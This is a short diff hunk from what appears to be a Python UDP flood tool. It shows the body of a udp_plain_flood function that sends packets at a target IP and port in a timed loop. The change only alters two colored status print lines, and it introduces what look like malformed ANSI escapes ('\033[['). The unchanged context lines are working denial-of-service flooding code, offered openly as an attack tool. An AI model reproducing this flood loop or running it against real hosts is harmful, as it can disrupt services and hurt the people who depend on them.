@@ -29,8 +29,8 @@ def udp_plain_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[103m \033[44mStarting UDP Plain flood on \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
-            print("\033[38;5;5m Starting UDP Plain flood on \033[38;5;5m" +str(packet_size)+ " \033[48;5;7m0k...!\033[0m")
+            print("\033[[103m \033[44mStarting UDP Plain flood on \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
+            print("\033[[38;5;5m Starting UDP Plain flood on \033[38;5;5m" +str(packet_size)+ " \033[48;5;7m0k...!\033[0m")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
